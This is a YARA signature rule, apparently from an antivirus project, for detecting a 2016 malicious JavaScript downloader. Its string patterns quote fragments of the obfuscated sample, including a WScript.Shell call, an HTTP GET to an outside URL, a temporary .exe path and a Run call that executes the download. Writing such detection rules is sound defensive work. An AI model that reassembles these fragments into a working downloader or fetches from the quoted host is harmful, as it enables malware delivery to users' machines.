rule sig_20160328_3b2a3f19eb6e7f52443200a205fab88f {
  meta:
    description = "datamaliciousorder - file 20160328_3b2a3f19eb6e7f52443200a205fab88f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e17940388610a266e0e49eb89d50df4a5d3400f258dcc375eb1188c4ec33d51"

  strings:
    $s1  = "function Awlmlx() {return Wawwis[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"wM7idVVg.exe\";};" fullword ascii
    $s2  = "Oatogfrn[Jebtxrs](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Rkmiuj](Ynkuboy() * 11)} while (Oatogfrn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Gcquepxr(Pnerv, Rafsu){return Pnerv - Rafsu;};" fullword ascii
    $s5  = "var Wawwis = function Znyll() {return WScript[Rscglmjnle](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Lxazdhtr(Jnazhqcjqs){Wawwis[\"Run\"](Jnazhqcjqs, Qgxwjb, Qgxwjb);};" fullword ascii
    $s7  = "function Hkowxcqvv() {return ((Wdbodej == true) && (Wdbodej == Frgzidjkj)) ? 1 : Qgxwjb;};" fullword ascii
    $s8  = "var Ahwjv = false;" fullword ascii
    $s9  = "var Frgzidjkj = false;" fullword ascii
    $s10 = " while (Qfothuup){" fullword ascii
    $s11 = "function Xatdyvi()" fullword ascii
    $s12 = "var Wdbodej = false;" fullword ascii
    $s13 = "function Afjzpqfhwg(){return Rscglmjnle;};" fullword ascii
    $s14 = "Wdbodej = true; " fullword ascii
    $s15 = "var Fnyoevext = new this[\"Date\"]();" fullword ascii
    $s16 = "function Ynkuboy(){return 22;};" fullword ascii
    $s17 = "Frgzidjkj = true; " fullword ascii
    $s18 = "function Cxztjwq(Soujhly) {var Gtswxjz = (1, 2, 3, 4, 5, Soujhly); return Gtswxjz;};" fullword ascii
    $s19 = "function Ojphg(){return Hnsuxt;};" fullword ascii
    $s20 = "return Gcquepxr(Ojidiabf, Lvskqi);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}